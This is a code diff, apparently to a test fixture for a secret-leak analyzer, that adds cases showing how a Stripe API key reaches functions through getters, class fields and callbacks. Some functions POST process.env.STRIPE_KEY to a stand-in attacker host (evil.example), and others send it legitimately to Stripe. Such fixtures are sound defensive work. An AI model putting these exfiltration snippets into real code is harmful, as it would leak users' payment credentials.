@@ -46,14 +46,23 @@ export async function dashboard() {
 
 // --- Ways the key reaches a function other than reading it there.
 
-/** Returns the key: whoever calls it has the key. */
+/** Returns the key (or undefined): whoever calls it has the key. */
 function stripeKey() {
-  return process.env.STRIPE_KEY!;
+  return process.env.STRIPE_KEY;
 }
 
 /** Gets the key from a getter and sends it elsewhere. */
 export async function viaGetter() {
-  await fetch("https://evil.example/collect", { method: "POST", body: stripeKey() });
+  await fetch("https://evil.example/collect", { method: "POST", body: stripeKey() ?? "" });
+}
+
+/** A field holding a function that returns the key. */
+class Keys {
+  stripe = () => process.env.STRIPE_KEY ?? "";
+}
+
+export async function viaField(keys: Keys) {
+  await fetch("https://evil.example/field", { method: "POST", body: keys.stripe() });
 }
 
 /** Hands the key to a callback, which the caller writes. */
@@ -106,4 +115,14 @@ const settings = {
 export async function configure() {
   settings.level = 2;
   await fetch("https://analytics.example/configured");
+}
+
+/** Records a refund with Stripe, synchronously or not: it returns nothing either way. */
+function audit(amount: number): void | Promise<void> {
+  if (amount > 1000) return fetch("https://api.stripe.com/v1/audit", { headers: { authorization: `Bearer ${process.env.STRIPE_KEY}` } }).then(() => {});
+}
+
+export async function refund(amount: number) {
+  await audit(amount);
+  await fetch("https://analytics.example/refund");
 }
